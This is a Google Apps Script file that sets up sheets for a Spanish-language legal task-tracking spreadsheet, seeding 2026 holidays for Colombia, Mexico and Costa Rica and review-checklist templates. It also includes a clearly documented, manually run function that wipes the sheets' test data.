function setupSheets() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var report = [];
  var log = function(msg) { report.push(msg); Logger.log(msg); };

  // ── 1. Feriados ─────────────────────────────────────────────────
  var fer = ss.getSheetByName(SHEET_FERIADOS);
  if (!fer) {
    fer = ss.insertSheet(SHEET_FERIADOS);
    fer.getRange(1, 1, 1, 3).setValues([['pais', 'fecha', 'nombre']]);
    fer.getRange(1, 1, 1, 3).setFontWeight('bold').setBackground('#FF4940').setFontColor('#FFFFFF');
    fer.setFrozenRows(1);
    fer.setColumnWidth(1, 60);
    fer.setColumnWidth(2, 110);
    fer.setColumnWidth(3, 280);
    log('✓ Hoja Feriados creada (con headers)');
  } else {
    log('· Hoja Feriados ya existía');
  }
  if (fer.getLastRow() <= 1) {
    var feriados = [
      // CO 2026 (18 feriados, Ley Emiliani aplicada)
      ['CO', '2026-01-01', 'Año Nuevo'],
      ['CO', '2026-01-12', 'Reyes Magos'],
      ['CO', '2026-03-23', 'Día de San José'],
      ['CO', '2026-04-02', 'Jueves Santo'],
      ['CO', '2026-04-03', 'Viernes Santo'],
      ['CO', '2026-05-01', 'Día del Trabajo'],
      ['CO', '2026-05-18', 'Ascensión del Señor'],
      ['CO', '2026-06-08', 'Corpus Christi'],
      ['CO', '2026-06-15', 'Sagrado Corazón'],
      ['CO', '2026-06-29', 'San Pedro y San Pablo'],
      ['CO', '2026-07-20', 'Día de la Independencia'],
      ['CO', '2026-08-07', 'Batalla de Boyacá'],
      ['CO', '2026-08-17', 'Asunción de la Virgen'],
      ['CO', '2026-10-12', 'Día de la Raza'],
      ['CO', '2026-11-02', 'Día de Todos los Santos'],
      ['CO', '2026-11-16', 'Independencia de Cartagena'],
      ['CO', '2026-12-08', 'Día de la Inmaculada Concepción'],
      ['CO', '2026-12-25', 'Navidad'],
      // MX 2026 (8 oficiales + Viernes Santo)
      ['MX', '2026-01-01', 'Año Nuevo'],
      ['MX', '2026-02-02', 'Día de la Constitución'],
      ['MX', '2026-03-16', 'Natalicio de Benito Juárez'],
      ['MX', '2026-04-03', 'Viernes Santo'],
      ['MX', '2026-05-01', 'Día del Trabajo'],
      ['MX', '2026-09-16', 'Día de la Independencia'],
      ['MX', '2026-11-02', 'Día de Muertos'],
      ['MX', '2026-11-16', 'Día de la Revolución'],
      ['MX', '2026-12-25', 'Navidad'],
      // CR 2026 (11 nacionales)
      ['CR', '2026-01-01', 'Año Nuevo'],
      ['CR', '2026-04-02', 'Jueves Santo'],
      ['CR', '2026-04-03', 'Viernes Santo'],
      ['CR', '2026-04-11', 'Juan Santamaría'],
      ['CR', '2026-05-01', 'Día del Trabajo'],
      ['CR', '2026-07-25', 'Anexión de Guanacaste'],
      ['CR', '2026-08-02', 'Virgen de los Ángeles'],
      ['CR', '2026-08-15', 'Día de la Madre'],
      ['CR', '2026-09-15', 'Día de la Independencia'],
      ['CR', '2026-12-01', 'Abolición del Ejército'],
      ['CR', '2026-12-25', 'Navidad']
    ];
    fer.getRange(2, 1, feriados.length, 3).setValues(feriados);
    log('✓ Insertadas ' + feriados.length + ' filas de feriados (CO+MX+CR 2026)');
  } else {
    log('· Feriados ya tenía ' + (fer.getLastRow() - 1) + ' filas, no se sobreescribe');
  }

  // ── 2. Templates ────────────────────────────────────────────────
  var tpl = ss.getSheetByName(SHEET_TEMPLATES);
  if (!tpl) {
    tpl = ss.insertSheet(SHEET_TEMPLATES);
    tpl.getRange(1, 1, 1, 2).setValues([['tipoTrabajo', 'checklist']]);
    tpl.getRange(1, 1, 1, 2).setFontWeight('bold').setBackground('#FF4940').setFontColor('#FFFFFF');
    tpl.setFrozenRows(1);
    tpl.setColumnWidth(1, 200);
    tpl.setColumnWidth(2, 600);
    log('✓ Hoja Templates creada (con headers)');
  } else {
    log('· Hoja Templates ya existía');
  }
  if (tpl.getLastRow() <= 1) {
    var templates = [
      ['Revisión NDA', JSON.stringify(['Verificar partes', 'Jurisdicción aplicable', 'Cláusulas IP', 'Término', 'Confidencialidad recíproca'])],
      ['Revisión contractual', JSON.stringify(['Partes y representación', 'Objeto del contrato', 'Plazo y vigencia', 'Precio y forma de pago', 'Resolución / terminación', 'Confidencialidad', 'Ley aplicable y jurisdicción'])],
      ['Derecho de petición', JSON.stringify(['Identificación del peticionario', 'Hechos relevantes', 'Pretensión clara', 'Fundamento jurídico', 'Soportes y anexos', 'Plazo legal de respuesta (15 días hábiles)'])]
    ];
    tpl.getRange(2, 1, templates.length, 2).setValues(templates);
    log('✓ Insertadas ' + templates.length + ' templates (NDA, Contractual, Petición)');
  } else {
    log('· Templates ya tenía ' + (tpl.getLastRow() - 1) + ' filas, no se sobreescribe');
  }

  // ── 3. Tracking Activo: col 19 = Contraparte (header en row 3) ──
  var tk = ss.getSheetByName(SHEET_ACTIVO);
  if (tk) {
    var lastColTk = tk.getLastColumn();
    var existingHdr = lastColTk >= TASK_CONTRAPARTE_COL ? tk.getRange(3, TASK_CONTRAPARTE_COL).getValue() : '';
    if (!existingHdr) {
      tk.getRange(3, TASK_CONTRAPARTE_COL).setValue('Contraparte');
      tk.getRange(3, TASK_CONTRAPARTE_COL).setFontWeight('bold');
      log('✓ Tracking Activo: agregada columna ' + TASK_CONTRAPARTE_COL + ' = Contraparte (row 3)');
    } else if (existingHdr === 'Contraparte') {
      log('· Tracking Activo ya tenía columna Contraparte');
    } else {
      log('⚠ Tracking Activo col ' + TASK_CONTRAPARTE_COL + ' tiene "' + existingHdr + '" — revisión manual');
    }
  } else {
    log('⚠ Hoja Tracking Activo no encontrada');
  }

  // ── 4. Proyectos: col 17 = ContrapartesConflicto (header en row 1)
  var pj = ss.getSheetByName(SHEET_PROYECTOS);
  if (pj) {
    var lastColPj = pj.getLastColumn();
    var existingHdrP = lastColPj >= PROJ_CONTRAPARTES_COL ? pj.getRange(1, PROJ_CONTRAPARTES_COL).getValue() : '';
    if (!existingHdrP) {
      pj.getRange(1, PROJ_CONTRAPARTES_COL).setValue('ContrapartesConflicto');
      pj.getRange(1, PROJ_CONTRAPARTES_COL).setFontWeight('bold').setBackground('#FF4940').setFontColor('#FFFFFF');
      log('✓ Proyectos: agregada columna ' + PROJ_CONTRAPARTES_COL + ' = ContrapartesConflicto (row 1)');
    } else if (existingHdrP === 'ContrapartesConflicto') {
      log('· Proyectos ya tenía columna ContrapartesConflicto');
    } else {
      log('⚠ Proyectos col ' + PROJ_CONTRAPARTES_COL + ' tiene "' + existingHdrP + '" — revisión manual');
    }
  } else {
    log('⚠ Hoja Proyectos no encontrada');
  }

  // ── 5. Flush caches ─────────────────────────────────────────────
  try {
    var cache = CacheService.getScriptCache();
    cache.remove('feriados_v1');
    cache.remove('templates_v1');
    cache.remove(CACHE_KEY);
    log('✓ Caches limpiadas (feriados_v1, templates_v1, ' + CACHE_KEY + ')');
  } catch(e) {
    log('⚠ Cache flush falló: ' + e.message);
  }

  log('—— setupSheets terminó ——');
  return report;
}

// ════════════════════════════════════════════════════════════════
// WIPE TEST DATA
// ════════════════════════════════════════════════════════════════
// Borra TODAS las filas de data de: Tracking Activo, Historial,
// Proyectos y Comments. Preserva headers + formato + Equipos + Config
// + Feriados + Templates.
//
// Para correr: en el editor de Apps Script, seleccionar wipeTestData
// en el dropdown de funciones y darle Run. El log devuelve cuántas
// filas se borraron por hoja.
//
// IMPORTANTE: es destructivo y no hay deshacer. Si necesitás guardar
// algo, primero hacé una copia del sheet (Archivo → Hacer una copia).

function wipeTestData() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  var report = [];
  var log = function(msg) { report.push(msg); Logger.log(msg); };

  // Hojas a limpiar con la row donde empieza la data (header arriba).
  var targets = [
    { name: SHEET_ACTIVO,    dataStart: 4 }, // headers en rows 1-3
    { name: SHEET_HISTORIAL, dataStart: 4 }, // mismo formato que Tracking Activo
    { name: SHEET_PROYECTOS, dataStart: 2 }, // header en row 1
    { name: SHEET_COMMENTS,  dataStart: 2 }  // header en row 1 (auto-creada)
  ];

  targets.forEach(function(t) {
    var ws = ss.getSheetByName(t.name);
    if (!ws) {
      log('· Hoja "' + t.name + '" no existe — skip');
      return;
    }
    var lastRow = ws.getLastRow();
    if (lastRow < t.dataStart) {
      log('· Hoja "' + t.name + '" ya está vacía (lastRow=' + lastRow + ')');
      return;
    }
    var numRows = lastRow - t.dataStart + 1;
    ws.deleteRows(t.dataStart, numRows);
    log('✓ "' + t.name + '": ' + numRows + ' filas borradas (preservados headers)');
  });

  // Invalidar caches para que el siguiente lector vea el sheet vacío.
  try {
    var cache = CacheService.getScriptCache();
    cache.remove(CACHE_KEY);
    cache.remove('feriados_v1');
    cache.remove('templates_v1');
    log('✓ Caches invalidadas');
  } catch (e) {
    log('⚠ Cache flush falló: ' + e.message);
  }

  log('—— wipeTestData terminó ——');
  log('Preservados: Equipos, Config, Feriados, Templates');
  return report;
}
